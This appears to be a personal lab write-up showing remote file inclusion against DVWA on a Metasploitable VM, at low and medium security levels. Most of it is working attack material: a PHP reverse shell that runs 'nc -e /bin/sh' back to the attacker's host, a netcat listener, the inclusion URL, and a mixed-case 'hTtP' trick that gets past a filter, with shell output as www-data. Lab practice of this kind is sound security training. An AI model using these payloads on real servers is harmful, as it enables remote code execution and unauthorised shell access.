### Remote File Inclusion Vulnerabilities-Low-Security

* Remote file inclusion vulnerabilties are similar to local file inclusion
* The difference is this time we run php files from another server onto this server.

* But first i'm to going to have to change the settings on the server to allow php files outside of this server.
* Allow_url and allow_url_fopen are two settings that need to be on before we can include any files outside of the server.

* Then restart the apache2 web server.

---

* For remote file inclusion to work you will need a server to host your php files on.
* But as i'm on the same network as the metasploitable machine i will not need this.

* So first create a php shell.

```php
<?php

passthru('nc -e /bin/sh 10.0.2.15 4444');

?>
```

* Then we save this as a .txt file as we don't want to being executed as php file on my machine.

* Now i'm to include this file on the metasplotable machine.
* But first setup a netcat listener

```
nc -vv -l -p 4444
```

* Now i append the php shell onto the end of the page.

```
http://10.0.2.5/dvwa/vulnerabilities/fi/?page=http://10.0.2.15/shell.txt
```

* Wait for my shell.

```
root@kali:~# nc -vv -l -p 4444
listening on [any] 4444 ...
10.0.2.5: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.5] 41786
ls -la
total 24
drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-rw-r--r--  1 www-data www-data  488 Aug 26  2010 include.php
-rw-r--r--  1 www-data www-data  818 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

* Now i have recieved my reverse shell.


---

### Remote File Inclusion Vulnerabilities-Medium-Security

* Now i have increase the security level to medium.
* When i try the same exploit as before there is an error meaning there is a filter.
* The server is most likely filtering http.

* So we can bypass by changing the characters from uppercase and lowercase.

```
10.0.2.5/dvwa/vulnerabilities/fi/?page=hTtP://10.0.2.15/shell.txt
```

* You can see i just made the first h uppercase and the last p.

* Now we try again with setup the listener.

```
nc -vv -l -p 4444
```
* We recieve a php reverse shell.

```
root@kali:~# nc -vv -l -p 4444
listening on [any] 4444 ...
10.0.2.5: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.5] 47483
ls -la
total 24
drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-rw-r--r--  1 www-data www-data  488 Aug 26  2010 include.php
-rw-r--r--  1 www-data www-data  818 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```


